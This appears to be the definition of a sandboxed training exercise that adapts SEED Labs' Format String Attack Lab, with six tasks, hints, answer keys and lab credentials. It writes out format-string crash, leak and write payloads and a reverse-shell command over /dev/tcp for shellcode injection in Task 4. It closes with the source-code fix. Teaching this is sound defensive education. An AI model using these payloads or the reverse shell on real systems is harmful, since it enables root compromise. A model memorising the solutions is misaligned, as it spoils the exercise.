title: Format String Attack Lab
description: A two-machine format-string exploitation exercise, following all six tasks of SEED Labs' Format String Attack Lab against the lab's own format.c/server.c, attacker vs. victim.
prerequisites: Comfortable with the Linux command line and basic C (pointers, the stack).
outcomes: Identify, leak through, write through, and exploit a format-string vulnerability on both a 32-bit and a 64-bit target, understand the 64-bit zero-byte-address constraint, and fix the underlying bug.

levels.title: Introduction
levels.content:
# General information

* This game is for educational purposes only.
* The solution of a level is required for later levels.

# Storyline

`format.c` has a classic format-string bug: it hands your input straight to `printf()` as the *format string itself* (`printf(msg)`), instead of as a `%s` argument (`printf("%s", msg)`). A copy of it runs on `victim`, fed over the network by `server.c`, which accepts a TCP connection, hooks it up as the program's stdin, and runs it with root privilege.

Across six tasks you will: crash it, read its memory, write to its memory, and finally inject code to get a root shell on `victim` - once as a 32-bit binary, once as a 64-bit one.

This exercise adapts SEED Labs' *Format String Attack Lab* (W. Du, CC BY-NC-SA 4.0) - see ATTRIBUTION.txt. You get the same files the handout's students get (`Makefile`, `server.c`, `format.c`, `attack-code/`); nothing about how the vulnerable program or the server wrapper behaves has been changed.

levels.title: Access the Attacker Machine
levels.cloud_content:
Access the sandbox, then submit **`start`**.

### Sandbox access
1. In the topology overview, right-click **`attacker`** and click **`Open GUI`**.
2. Login with username **`seed`** and password **`dees`**.

`~/attack-code/build_string.py` and `~/attack-code/exploit.py` are already there - the handout's own scaffolding, nothing solved for you.

See [documentation](https://docs.platform.cyberrange.cz/user-guide-advanced/sandboxes/sandbox-access/#user-access) for SSH access.
levels.local_content: This sandbox has not been tested for use with local sandbox.

levels.title: Access the Victim Machine and Build the Servers
levels.cloud_content:
Access `victim`, build the lab yourself exactly as the handout's Section 2.3 has you do with `make` / `make install`, start both servers, then submit **`running`**.

### Sandbox access
1. In the topology overview, right-click **`victim`** and click **`Open GUI`**.
2. Login with username **`seed`** and password **`dees`**.

### Build and start the servers
```
cd ~/server-code
make
sudo nohup ./server32 > ~/server32.log 2>&1 &
sudo nohup ./server64 > ~/server64.log 2>&1 &
disown -a
```
`server32` execs `format-32` and listens on **TCP/9090**; `server64` execs `format-64` and listens on **TCP/9092**. Both run as root, same as the handout's server (Section 2.2). `sudo` here is scoped to only these two binaries - there is no general root shell handed to you.

Each server prints its own banner (input buffer address, secret's address, target's address, frame pointer, ...) to the log file you redirected it to - `tail -f ~/server32.log` (or `~/server64.log`) in a second terminal on `victim` to watch it, the same way the handout's students watch their container's console (Section 2.3).
levels.local_content: This sandbox has not been tested for use with local sandbox.

levels.title: Task 1: Crashing the Program
levels.content:
From `attacker`, send a benign message to `server32` first, and watch `server32.log` on `victim`:

```
echo hello | nc 10.1.26.20 9090
```
You should see the program report its received size and finish normally.

Now send input made up of several `%s` specifiers instead of plain text, and compare the log.

The flag is the exact line that appears in the log after a benign request but never after a crashing one.
levels.solution:
```
$ printf 'hello' | nc 10.1.26.20 9090
$ printf '%s%s%s%s%s%s%s%s%s%s%s%s' | nc 10.1.26.20 9090
```
Each `%s` makes `printf` dereference the next stack value as a pointer; most of them are not valid addresses, so `format-32` segfaults inside `myprintf()` before `main()` can print its closing line.

hints.title: Which program crashes?
hints.content: format-32 crashes; server32 (the listener) does not - it just spawns a new format-32 for the next connection.

hints.title: Why does it crash?
hints.content: Each %s tells printf to dereference the next stack value as a pointer; most aren't valid.

levels.title: Task 2: Printing Out the Server Program's Memory
levels.content:
Still against `server32` (10.1.26.20:9090).

**Task 2.A - Stack data.** How many `%x` specifiers does it take before the output matches the first four bytes of your own input? Send a unique 4-byte marker followed by several `%x`, and compare against `server32.log`. This offset is the key you need for every later task - get it right.

**Task 2.B - Heap data.** `server32.log` also gives you the secret message's address directly. Using your Task 2.A offset with `%N$s` (positional parameter) and that address placed little-endian at the very start of your input, leak the secret.

The flag is the secret string revealed in 2.B.
levels.solution: 2.A: send e.g. `AAAA%x%x%x%x%x%x%x%x` and see at which `%x` `41414141` appears. 2.B: pack the secret's address (from the log) as 4 little-endian bytes, then `%<offset>$s` to have printf treat that address as a string pointer and print what it points to.

hints.title: Finding your offset (2.A)
hints.content: Send a unique marker followed by several %x and look for which one echoes it back.

hints.title: Byte order (2.B)
hints.content: x86 is little-endian: 0xAABBCCDD is stored as DD CC BB AA.

levels.title: Task 3: Modifying the Server Program's Memory
levels.content:
Still against `server32`. Use `%n` with your Task 2.A offset to *write* to an address instead of reading it - target the `target` variable, whose address is also in `server32.log`.

**3.A** - change `target` to any different value, to confirm the write works at all.
**3.B** - change it to exactly `0x5000`.
**3.C** - change it to `0xAABBCCDD`. Printing that many characters with a plain `%n` would take far too long - use `%hn` (or `%hhn`) to write 2 (or 1) bytes at a time instead of 4.

The flag is the line `server32.log` prints once `target` reads back as exactly `0x5000` (3.B).
levels.solution: A width field like `%05000d` lets you set printf's running output-byte-count to 0x5000 before the `%n` fires at your target's address. For 3.C, split the 4-byte target into two 2-byte halves and write each with its own `%hn` at its own half-address.

hints.title: Controlling the byte count (3.B)
hints.content: A width-padded conversion like %050d lets you set printf's running output-byte-count before the %n.

hints.title: Large values (3.C)
hints.content: %hn / %hhn write 2 / 1 bytes at a time, reaching a large target without huge padding.

levels.title: Task 4: Inject Malicious Code into the Server Program
levels.content:
Combine Tasks 2-3: place the shellcode from `~/attack-code/exploit.py` (32-bit version) somewhere in your own 1500-byte input, work out the address it lands at, and use the `%n` write primitive to overwrite `myprintf()`'s saved return address with that address, so when it returns, it jumps into your shellcode instead.

First demonstrate this with the shellcode's stock command (`/bin/ls -l; echo ...`) - watch `server32.log` for its output.

Then get a **reverse shell**: edit the command string to
```
/bin/bash -i > /dev/tcp/10.1.26.10/7070 0<&1 2>&1
```
(10.1.26.10 is `attacker`), keeping the string's total length unchanged (pad with spaces). On `attacker`, listen first:
```
nc -nv -l 7070
```
then send your payload to `server32` (10.1.26.20:9090). You should get a root shell back on `attacker`'s terminal.

The flag is the content of `/root/flag_reverse_shell.txt` on `victim`, read from that reverse shell.
levels.solution: Put the shellcode at offset 0 of your payload; its address is the input buffer's address from `server32.log`. Overwrite the return address of myprintf() (handout Figure 1, location 2) with that address, using the same %n primitive as Task 3 at the offset that lands on that stack slot.

hints.title: Where does the shellcode go?
hints.content: Anywhere in your own input, at a known offset you can compute an address for - offset 0 is simplest.

hints.title: What do you overwrite?
hints.content: The saved return address of the function printf() is running inside - handout Figure 1, location 2.

levels.title: Task 5: Attacking the 64-bit Server Program
levels.content:
Repeat Task 4 against `server64` (10.1.26.20:9092, execs `format-64`), using the 64-bit shellcode in `exploit.py` and a fresh reverse shell listener on `attacker`.

x86-64 user-space addresses never exceed `0x00007FFFFFFFFFFF`, so every 8-byte address you place in your payload has zero bytes in it - and `printf()` stops reading its format string at the first `\0`. You therefore can't paste a raw address into the middle of your payload followed by more format-string text; every address has to sit at the very start of the buffer instead, reached with `%N$` positional parameters (the same syntax you already used in Tasks 2-4).

The flag: how many of the 8 bytes in a typical x86-64 user-space address are always `0x00`?
levels.solution: Two. Valid x86-64 user-space addresses top out at 0x00007FFFFFFFFFFF, so the top two bytes of every address are always zero - which is why every address in this exercise's payloads has to sit at the start of the buffer (via %N$), never in the middle followed by more text.

hints.title: Where do the zero bytes come from?
hints.content: x86-64 Linux user-space addresses top out around 0x00007FFFFFFFFFFF.

levels.title: Task 6: Fixing the Problem
levels.content:
`gcc` warns about the vulnerable `printf(msg)` call at compile time by default - you saw it the first time you ran `make`. Find the warning.

Fix the vulnerability in your own copy of `format.c` (pass the input as a `%s` argument instead of as the format string itself: `printf("%s", msg)`), rebuild, and confirm your Task 1 payload no longer crashes it.

The flag is the name of the compiler warning flag gcc reports for this mistake (format: `-W...`).
levels.solution: `-Wformat-security`. Changing `printf(msg)` to `printf("%s", msg)` makes every `%` in the input a literal character again, and the warning disappears on rebuild.

hints.title: Where's the warning?
hints.content: It appears during `make`, pointing at the printf(msg) line in format.c.
